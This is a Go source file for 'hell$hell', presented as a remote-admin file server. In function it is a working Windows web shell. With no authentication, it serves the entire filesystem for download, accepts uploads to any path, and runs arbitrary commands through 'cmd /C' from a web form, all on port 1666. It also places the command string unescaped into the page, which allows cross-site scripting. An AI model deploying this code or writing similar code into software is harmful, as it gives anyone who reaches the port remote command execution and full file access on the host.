/*
The hell$hell is lightweight web file server for remote admins
Browsing and transfering files, execute command
By default serving at http://localhost:1666/
*/

package main

import (
	"fmt"
	"html"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
)

// Revision ID
const Revision = "$Id$"

var (
	stdout           []byte   //Output of command
	dirs, navi, href []string // Catalogs of Path
	err              error    //Error
)

//myContract (HTTP response)
func myContract(serv http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if 0 < strings.Index(r.URL.Path, "favicon.ico") {
			//TODO return $ favicon.ico
			return
		}
		filename := r.URL.Path
		if '/' != filename[len(filename)-1] {
			file, _ := os.Open(filename)
			defer file.Close()
			io.Copy(w, file) //Download file
			return
		}
		//Navigation ------------------------
		dirs = strings.Split(r.URL.Path, "/")
		href := []string{}
		navi := append(navi, "<hr/><a href=\"/\">ROOT")
		for _, dir := range dirs[1 : len(dirs)-1] {
			navi = append(navi, "</a>/<a href=\"/")
			href = append(href, dir)
			href = append(href, "/")
			navi = append(navi, strings.Join(href, ""))
			navi = append(navi, "\">")
			navi = append(navi, dir)
		}
		navi = append(navi, "</a><br/><hr/>\n")
		//Navigation ---------------------

		io.WriteString(w, htmlhead) //Before
		io.WriteString(w, strings.Join(navi, ""))

		if r.Method == "POST" { //Upload file
			r.ParseMultipartForm(32 << 20)
			if file, handler, err := r.FormFile("uploadfile"); err == nil {
				defer file.Close()
				f, err := os.OpenFile(r.URL.Path+handler.Filename, os.O_WRONLY|os.O_CREATE, 0666)
				//TODO Message to webmuzzle
				if err != nil { fmt.Println(err)
				} else {
					defer f.Close()
					io.Copy(f, file)
				}
			} else {
				fmt.Println(err)
			}
		}

		cmdstr := r.FormValue("cmd")
		htmlCmdForm := strings.Replace(htmlform, "$CMD$", cmdstr, 1)
		io.WriteString(w, htmlCmdForm) //Web muzzle

		if 0 < len(cmdstr) {
//TODO Set Timeout for exec or Kill button
/*TODO Set Environment before execute
			cmd.Env = append(os.Environ(),
			    "FOO=duplicate_value",
			    "FOO=actual_value",
			)
			*/
//TODO Escaped file name 
			os.Chdir(r.URL.Path)
			stdout, err = exec.Command("cmd", "/C", cmdstr).Output()
			if err != nil {
				io.WriteString(w, "Error: " + err.Error())
			}
			io.WriteString(w, "<pre class=\"term\">")
			io.WriteString(w, html.EscapeString(string(stdout)))
			io.WriteString(w, "</pre><hr/>")
		}

		serv.ServeHTTP(w, r) //Call origin

		io.WriteString(w, strings.Join(navi, ""))
		io.WriteString(w, htmltail) //HTML Tail
	})
}

//hell$hell init
func init() {
	http.Handle("/", myContract(http.FileServer(http.Dir("/"))))
	http.ListenAndServe(":1666", nil)
}

//hell$hell run
func main() {}

//Web muzzle
var htmltail string = "</body></html>"

//TODO HTML CSS hackstyle
//TODO Auto setup meta codepage
var htmlhead string = `
<!DOCTYPE html>
<html>
<head><title>Hell$hell</title></head>
<style>
pre {
	font-family: Consolas, Courier New
}
body {
	text-align: left;
	margin-left: 5%;
	font-family: Consolas;
	font-size: 14pt;
}
input {
	font-family: Consolas;
	font-size: 16pt;
}
.cmd {
	width: 70%;
	font-family: Consolas;
	font-size: 14pt;
}
.middle {
	vertical-align: middle;
	height: 7em;
	line-height: 7em;
}
</style>
<body>
	<form enctype="multipart/form-data" action="" method="post">
 		<input type="file" name="uploadfile" />
 	   <input type="hidden" name="token" value="{{.}}"/>
 	  	 <input type="submit" value="upload" />
	</form>
	<hr/>
`

//TODO Set os.Environ to webmuzzle
var htmlform string = `
<div class="cmd">
	<form id="cmdstr">
cmd.exe&gt;<input class="cmd" type="text" name="cmd" value="$CMD$"/>
	   <input type="submit" value="Enter" /><br/>
<!--input class="env" type="textbox" name="env" value=""/-->
	</form>
</div>
`

//EOF
